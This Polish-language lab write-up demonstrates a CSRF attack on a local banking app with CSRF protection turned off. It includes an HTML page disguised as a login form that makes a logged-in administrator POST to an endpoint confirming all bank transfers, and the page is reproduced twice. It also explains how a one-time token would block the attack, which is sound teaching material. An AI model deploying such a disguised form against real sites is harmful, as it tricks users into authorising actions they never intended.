# XSRF(Cross Site Request Forgery) wykorzystujący wyłączone zabezpieczenie CSRF w serwerze.

## Scenariusz użycia:
Administrator może zatwierdzić wszystkie przelewy wchodząc na stronę `http://localhost:8000/bank/admin/confirm_all/`. Jeśli jest on zalogowany na konto administratora, wystarczy, aby podłożyć mu link do tej strony, na przykład jako `action` w formularzu na innej stronie.

## Przykład:

1. Formularz takiej postaci, ktory wydaje sie byc formularzem logowania, tak na prawde wysle post pod adres zatwierdzajacy przelewy. Serwer bedzie myslal, ze jest to poprawne zapytanie, wystosowane do niego.
```
<h1>The other site</h1>
<p>Hello, please log in</p>
<form class="" action="http://localhost:8000/bank/admin/confirm_all/" method="post">
    User: <input type="text" name="user" value="" required></input>
    Password: <input type="text" name="user" value="" required></input>
    <input type="submit" value="login"></input>
</form>
```

Gdyby zastosowano zabezpieczenie przed CSRF, ta inna witryna nie wiedziałaby jaki jest jednorazowy token, ktorego serwer spodziewa sie wraz z danymi z metody post i prosba zostanie odrzucona.

<h1>The other site</h1>
<p>Hello, please log in</p>
<form class="" action="http://localhost:8000/bank/admin/confirm_all/" method="post">
    User: <input type="text" name="user" value="" required></input>
    Password: <input type="text" name="user" value="" required></input>
    <input type="submit" value="login"></input>
</form>
